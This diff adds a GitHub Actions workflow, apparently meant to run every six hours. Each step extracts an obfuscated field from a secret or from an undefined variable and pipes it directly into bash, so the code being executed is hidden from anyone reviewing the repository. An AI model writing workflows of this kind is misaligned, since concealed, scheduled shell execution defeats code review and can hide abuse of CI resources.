@@ -1,0 +1,24 @@
+name: fuhongxuewangg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuhongxuewangg
+        env:
+          v0604: ${{ secrets.v0604 }}
+        run: |
+          echo $v0604 | jq -r .qt30 | /bin/bash
+          echo $qkun2 | jq -r .tn7795 | /bin/bash
+          echo $ndgqg5 | jq -r .zfwp03022 | /bin/bash
+          echo $xwh44 | jq -r .ot957 | /bin/bash
+          echo $q662 | jq -r .bj35 | /bin/bash
+          echo $gw9472 | jq -r .kmqk64 | /bin/bash
+          echo $xdxmm5762 | jq -r .auxv66 | /bin/bash
+          echo $tn1526 | jq -r .qgm753 | /bin/bash
+
